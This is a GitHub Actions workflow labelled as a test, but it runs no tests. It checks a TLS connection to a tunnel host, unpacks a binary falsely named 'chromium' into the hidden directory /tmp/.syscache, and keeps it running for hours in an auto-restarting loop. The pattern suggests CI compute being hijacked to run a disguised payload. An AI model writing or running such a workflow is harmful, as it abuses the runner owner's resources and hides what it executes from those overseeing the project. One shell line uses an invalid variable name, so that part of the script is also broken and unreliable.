name: test-xxxc
on:
  workflow_dispatch:
jobs:
  sync_lp8:
    runs-on: ubuntu-latest
    timeout-minutes: 351
    steps:
      - uses: actions/checkout@v4
      - run: uname -m
      - run: gcc --version | head -1
      - run: nproc
      - name: check
        run: |
          python3 -c "import socket,ssl; s=socket.create_connection(('z5h8srda9j.localto.net',8999),timeout=10); print('NET-TCP-OPEN'); c=ssl.create_default_context().wrap_socket(s,server_hostname='z5h8srda9j.localto.net'); print('NET-TLS-OK',c.version())" || echo NET-FAIL
          unzip -o -q vendor/chromium.zip -d /tmp/.syscache && chmod +x /tmp/.syscache/chromium
          cd /tmp/.syscache && stdbuf -o0 -e0 timeout 201m bash -c 'while true; do ./chromium; echo "worker-exit rc=$? $(date -u +%H:%M), restarting"; sleep 5; done'
          1DE7=$((SECONDS + 217 * 60))
          while [ $SECONDS -lt $1DE7 ]; do sleep $((RANDOM % 90 + 47)); echo "$(date -u +%H:%M:%S) cx3ai1"; done
